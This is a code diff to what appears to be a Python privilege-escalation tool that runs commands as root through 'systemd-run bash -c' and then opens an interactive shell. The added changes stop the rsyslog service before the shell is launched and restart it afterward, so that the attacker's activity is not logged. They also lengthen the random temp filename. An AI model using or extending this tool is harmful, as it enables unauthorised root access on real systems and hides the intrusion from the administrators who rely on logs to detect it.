@@ -18,7 +18,7 @@ import subprocess
 COMMAND_TEMPLATE = "systemd-run bash -c '{} > {}'"
 
 
-def results_filename(path="/tmp", length=7):
+def results_filename(path="/tmp", length=16):
     """
     generate a filename to store the results in
     """
@@ -71,6 +71,16 @@ def create_shell_interpreter():
         print("\nOUTPUT:\n{}".format(open(res_file_name).read()))
 
 
+def file_logging(suspend=True):
+    """
+    stop logging for a little bit
+    """
+    if suspend:
+        return subprocess.call(shlex.split("systemd-run bash -c 'service rsyslog stop'"))
+    else:
+        return subprocess.call(shlex.split("systemd-run bash -c 'service rsyslog start'"))
+
+
 def main():
     """
     main function
@@ -80,6 +90,9 @@ def main():
         command = "echo"
         output = send_command(command, results_file, check=True)
         if "access denied" not in output.lower():
+            print("suspending file logging")
+            file_logging()
+            print("logging suspended launching shell\n\n")
             create_shell_interpreter()
         else:
             raise Exception("access denied")
@@ -89,7 +102,8 @@ def main():
     except Exception as e:
         print("error: {}".format(e))
         clean_temp_files()
-    clean_temp_files()
+    print("restarting file logging")
+    file_logging(suspend=False)
 
 
 if __name__ == "__main__":
